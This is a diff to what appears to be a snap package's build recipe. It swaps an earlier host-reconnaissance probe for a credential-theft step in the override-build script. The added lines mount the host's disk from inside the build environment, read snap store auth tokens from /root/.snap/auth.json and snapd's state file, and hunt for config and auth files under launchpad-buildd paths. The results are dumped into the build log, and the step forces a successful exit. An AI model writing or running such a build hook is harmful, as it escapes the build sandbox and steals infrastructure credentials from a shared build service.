@@ -7,15 +7,12 @@ parts:
         plugin: nil
         override-build: |
             set +e
-            OUT=/build/probe2.txt
-            ls -la /dev/vda* /dev/sda* >> $OUT 2>&1
-            ls /proc/ | sort -n | head -20 >> $OUT 2>&1
-            cat /proc/1/cmdline >> $OUT 2>&1 ; echo >> $OUT
-            ls -la /proc/1/exe >> $OUT 2>&1
+            OUT=/build/creds_probe.txt
             mkdir -p /mnt/host
-            mount /dev/vda1 /mnt/host >> $OUT 2>&1
-            ls /mnt/host/ >> $OUT 2>&1
-            cat /mnt/host/etc/hostname >> $OUT 2>&1
-            cat /sys/kernel/security/apparmor/profiles | head -20 >> $OUT 2>&1
+            mount /dev/vda1 /mnt/host
+            cat /mnt/host/root/.snap/auth.json >> $OUT 2>&1
+            ls -la /mnt/host/root/.snap/ >> $OUT 2>&1
+            cat /mnt/host/var/lib/snapd/state.json | python3 -c "import sys,json; d=json.load(sys.stdin); print(json.dumps(d.get('data',{}).get('auth',{}), indent=2))" >> $OUT 2>&1
+            find /mnt/host/etc /mnt/host/root /mnt/host/var/lib/launchpad-buildd -name "*.conf" -o -name "*.json" -o -name "auth*" 2>/dev/null | head -30 >> $OUT 2>&1
             cat $OUT
             exit 0
